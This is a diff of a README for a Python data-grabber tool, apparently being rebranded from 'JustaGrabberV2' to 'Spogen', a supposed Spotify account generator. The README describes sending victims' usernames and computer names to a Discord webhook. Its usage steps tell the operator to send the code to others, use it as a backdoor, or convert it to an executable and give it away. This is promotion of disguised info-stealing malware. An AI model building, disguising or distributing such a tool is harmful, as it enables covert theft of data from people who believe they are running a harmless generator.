@@ -16,7 +16,8 @@
 #### 💗 Features v.1.0 !!
  * Spotify account generator
  * Settings
- * And more
+ * CPU, Memory Info
+ * And more!
  
 #### 🎁 Things will send to you when it grabs someting :
  -  Username, Computer name
@@ -27,15 +28,16 @@
  
 > 📷 Webhook screenshot
 
-<p align="left"><img src="https://media.discordapp.net/attachments/953929313235914763/956427125081137192/unknown.png?width=564&height=572"</p>
+<p align="left"><img src="https://media.discordapp.net/attachments/1010120833617895424/1048223757426249758/image.png"</p>
 
 ### ❗ About modules
-If requests module is not installed in your victim's computer,
-JustaGrabberV2 will just exit.
+You have to install 3 modules to use Spogen.
+Requests, psutil, colorama :>
+Install them by pip command or run start.bat
  
 ### 📁・ How to use
-1. Download python 3 at [python.org](https://python.org). Must be 3.x.x
-2. Open "JustaGrabberV2.py" with any code editor.
+1. Download python 3 at [python.org](https://python.org). It must be upper than v.3
+2. Install modules by ```pip install -r requirements.txt```
 3. Replace Your settings at line 20-27
 4. Send the code or use as backdoor. Or convert to exe then give to others
 
